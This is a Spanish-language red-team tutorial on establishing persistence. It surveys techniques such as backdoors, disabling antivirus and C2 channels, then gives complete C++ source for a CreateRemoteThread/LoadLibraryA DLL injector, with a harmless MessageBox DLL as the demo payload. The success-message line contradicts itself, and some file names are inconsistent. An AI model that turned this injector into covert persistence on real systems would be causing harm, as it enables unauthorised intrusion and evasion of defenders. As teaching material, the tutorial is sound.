# Establecer presencia via Inyección en DLLs #1

Cuando hablamos de establecer presencia se refiere a la fase en la que los miembros del Red Team aseguran un acceso persistente a los sistemas y redes comprometidos. 
Esta etapa es crucial para garantizar que el equipo pueda mantener su acceso incluso si se reinician los sistemas, se aplican parches o se toman medidas 
de seguridad adicionales. Establecer presencia implica varias actividades, entre las cuales pueden inluciur:

1. **Instalación de Backdoors y RATs (Remote Access Trojans):** Los simuladores pueden instalar backdoors o troyanos de acceso remoto que les permitan conectarse a los sistemas comprometidos en cualquier momento. Estos backdoors están diseñados para evadir la detección y persistir a través de reinicios y actualizaciones del sistema.

1. **Modificación de Servicios y Tareas Programadas:** Los miembros del Red Team pueden modificar servicios existentes o crear nuevas tareas programadas que ejecuten código malicioso de forma periódica, asegurando así que el acceso se restaure automáticamente si se pierde.

1. **Alteración de Configuraciones de Seguridad:** Pueden realizar cambios en las configuraciones de seguridad del sistema, como deshabilitar antivirus, modificar firewalls o alterar políticas de contraseñas, para reducir las posibilidades de detección y eliminación.

1. **Uso de Técnicas de Persistence en el Registro y el Sistema de Archivos:** Los atacantes pueden agregar claves al registro de Windows o archivos en ubicaciones específicas que garanticen la ejecución de su código malicioso durante el inicio del sistema o cuando se ejecutan ciertas aplicaciones.

1. **Establecimiento de Canales de Comunicación Encubiertos:** Para mantener una comunicación constante con los sistemas comprometidos, el Red Team puede establecer canales de comunicación encubiertos utilizando técnicas como tunelización de tráfico a través de protocolos legítimos (HTTP, HTTPS) o la creación de dominios de comando y control (C2) difíciles de detectar.

1. **Uso de Credenciales Robadas:** Aprovechan credenciales robadas para crear nuevas cuentas de usuario con permisos administrativos o modificar cuentas existentes, proporcionando una forma adicional de acceso que es menos probable que sea detectada.

1. **Inyector de DLLs:** Los miembros del Red Team pueden modificar o colocar una DLL maliciosa en un directorio donde una aplicación vulnerable la cargará en lugar de la DLL legítima.

En este caso hablaremos del punto 7 la modificación o inyección en DLLs **(Dynamic-Link Libraries)**.  Esta técnica se utiliza para insertar código malicioso en procesos legítimos del sistema, permitiendo así la persistencia y la ejecución del código malicioso de manera encubierta, haciendo que la actividad maliciosa sea más difícil de detectar.

## Métodos Comunes de Inyección en DLLs


- **Inyección de DLL Básica:** Involucra el uso de funciones de la API de Windows como **`CreateRemoteThread`** y **`LoadLibrary`** para inyectar la DLL en el proceso objetivo.

- **Hooking de Funciones:** Los atacantes pueden interceptar llamadas a funciones específicas en una DLL legítima y redirigirlas a su propio código malicioso.

- **Reflective DLL Injection:** Permite la carga de una DLL directamente en la memoria sin escribir en el disco, lo que ayuda a evadir la detección basada en el sistema de archivos.

- **AppInit_DLLs:** Utiliza la clave de registro **`AppInit_DLLs`** para cargar automáticamente DLLs especificadas en todos los procesos que usan user32.dll.

- **Hijacking de DLL:** Consiste en reemplazar una DLL legítima con una maliciosa en ubicaciones donde el sistema espera encontrar la DLL original.

## Ventajas de la Inyección en DLLs

a.) **Persistencia:** Permite mantener acceso continuo al sistema, incluso después de reinicios o cambios en la configuración de seguridad.

b.) **Evasión:** Al inyectar código malicioso en procesos legítimos, la actividad maliciosa puede camuflarse, haciendo más difícil su detección por herramientas de seguridad.

c.) **Acceso a Funcionalidades del Proceso:** El código inyectado puede aprovechar las capacidades y permisos del proceso anfitrión, lo que puede incluir acceso a recursos de red, archivos y más.

## Ejemplo de Proceso de Inyección en DLL

```plaintext
Proceso de Inyección en DLL
--------------------------------------

1. Identificación del Proceso Objetivo
   ├── Seleccionar un proceso en ejecución
   │    con privilegios elevados o acceso
   │    a recursos necesarios.
   │
   └──┬──>
      │
2. Inyección de la DLL
   ├── Utilizar técnicas de inyección para
   │    cargar la DLL maliciosa en el
   │    proceso objetivo.
   │
   └──┬──>
      │
3. Ejecución del Código Malicioso
   ├── El código malicioso en la DLL se
   │    ejecuta, permitiendo al atacante
   │    realizar acciones como:
   │    - Exfiltración de datos
   │    - Creación de backdoors adicionales
   │    - Manipulación del sistema
   │
   └──┬──>
      │
4. Mantenimiento de la Persistencia
   └── Asegurar que la DLL permanezca cargada
        y operativa incluso después de reinicios
        o intentos de remediación por parte del
        equipo de seguridad.
```

## Ejemplo Básico de Inyección en DLL via C++

En este ejemplo trataremos de inyectar una DLL en un proceso especificado por su ID de proceso (PID). La DLL se cargará en el proceso objetivo utilizando las funciones **`OpenProcess`**, **`VirtualAllocEx`**, **`WriteProcessMemory`**, **`CreateRemoteThread`** y **`LoadLibrary`**.

1. **DLL a Inyectar (ejemplo.dll):** Creamos una DLL simple la cual será inyectada en el proceso objetivo. Aquí te dejo un ejemplo de una DLL en C++:

```C++
// ejemplo.cpp
// Compilar este código en una DLL (ejemplo.dll)
// Taurus Omar
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, L"DLL Injected!", L"Success", MB_OK);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```


2. **Código de Inyección:** Este es el código que inyectará la DLL en el proceso objetivo:

```C++
// inyector.cpp
// Compilar este código en un exe (inyector.exe)
// Taurus Omar
#include <windows.h>
#include <iostream>
#include <tchar.h>

BOOL InjectDLL(DWORD dwPID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (hProcess == NULL) {
        std::cerr << "Failed to open target process." << std::endl;
        return FALSE;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemotePath == NULL) {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemotePath, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "Failed to write to target process memory." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get the address of LoadLibraryA in kernel32.dll
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (pLoadLibraryA == NULL) {
        std::cerr << "Failed to get address of LoadLibraryA." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create a remote thread in the target process that calls LoadLibraryA
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread in target process." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

int main() {
    DWORD pid;
    char dllPath[MAX_PATH];

    std::cout << "Enter the PID of the target process: ";
    std::cin >> pid;

    std::cout << "Enter the full path of the DLL to inject: ";
    std::cin >> dllPath;

    if (InjectDLL(pid, dllPath)) {
        std::cout << "DLL injection succeeded." << std::endl;
    } else {
        std::cout << "DLL injection failed." << std::endl;
    }

    return 0;
}

```

## Pasos para Ejecutar el Ejemplo

1. Compila la DLL: Usa un compilador como Visual Studio para compilar ejemplo.cpp ---> ejemplo.dll
2. Compila el inyector: Compilar injector.cpp en un ejecutable inyector.cpp ---> inyector.exe
3. Ejecuta el Inyector:
   * Ejecuta el proceso objetivo en el que deseas inyectar la DLL.
   * Ejecuta el inyector (inyector.exe) y proporciona el PID del proceso objetivo y la ruta completa a example.dll.

## Ejemplo practico 
```
Enter the PID of the target process: 1234
Enter the full path of the DLL to inject: C:\path\to\ejemplo.dll
```
Si el inyector tiene éxito, verás el mensaje "DLL injection succeeded." en la consola del inyector y un cuadro de mensaje"DLL injection failed.".


Una vez que se ejecute el inyector de DLL, el flujo de eventos sería el siguiente:
```plaintext
 +---------------------------------------------------------+
 | Apertura del Proceso Objetivo                           |
 |---------------------------------------------------------|
 | El inyector abre el proceso objetivo utilizando         |
 | la función OpenProcess. Si tiene éxito, obtiene         |
 | un handle al proceso.                                   |
 +-------------------------------+-------------------------+
                                 |
 +-------------------------------v-------------------------+
 | Asignación de Memoria en el Proceso Objetivo            |
 |---------------------------------------------------------|
 | El inyector asigna memoria en el espacio de             |
 | direcciones del proceso objetivo utilizando             |
 | VirtualAllocEx. Esta memoria será utilizada             |
 | para almacenar la ruta de la DLL que se va a inyectar.  |
 +-------------------------------+-------------------------+
                                 |
 +-------------------------------v-------------------------+
 | Escritura de la Ruta de la DLL en la Memoria Asignada   |
 |---------------------------------------------------------|
 | El inyector escribe la ruta completa de la DLL en       |
 | la memoria asignada del proceso objetivo utilizando     |
 | WriteProcessMemory.                                     |
 +-------------------------------+-------------------------+
                                 |
 +-------------------------------v-------------------------+
 | Obtención de la Dirección de LoadLibraryA               |
 |---------------------------------------------------------|
 | El inyector obtiene la dirección de la función          |
 | LoadLibraryA en kernel32.dll. Esta función se           |
 | utilizará para cargar la DLL en el proceso objetivo.    |
 +-------------------------------+-------------------------+
                                 |
 +-------------------------------v-------------------------+
 | Creación de un Hilo Remoto                              |
 |---------------------------------------------------------|
 | El inyector crea un hilo remoto en el proceso           |
 | objetivo utilizando CreateRemoteThread. Este hilo       |
 | ejecuta la función LoadLibraryA con la ruta de          |
 | la DLL como argumento.                                  |
 +-------------------------------+-------------------------+
                                 |
 +-------------------------------v-------------------------+
 | Carga de la DLL                                         |
 |---------------------------------------------------------|
 | La función LoadLibraryA en el hilo remoto carga         |
 | la DLL en el espacio de direcciones del proceso         |
 | objetivo. Esto ejecuta el código de la función          |
 | DllMain de la DLL.                                      |
 +-------------------------------+-------------------------+
                                 |
 +-------------------------------v-------------------------+
 | Mensaje de Éxito                                        |
 |---------------------------------------------------------|
 | Si la DLL se ha cargado correctamente y se ha ejecutado |
 | su DllMain, el código de la DLL puede realizar acciones |
 | adicionales, como mostrar un mensaje. En el ejemplo     |
 | proporcionado, la DLL muestra un mensaje con MessageBox |
 | cuando se inyecta.                                      |
 +-------------------------------+-------------------------+
                                 |
 +-------------------------------v-------------------------+
 | Limpieza                                                |
 |---------------------------------------------------------|
 | El inyector espera a que el hilo remoto termine y luego |
 | libera la memoria asignada en el proceso objetivo.      |
 | Finalmente, cierra los handles abiertos.                |
 +---------------------------------------------------------+
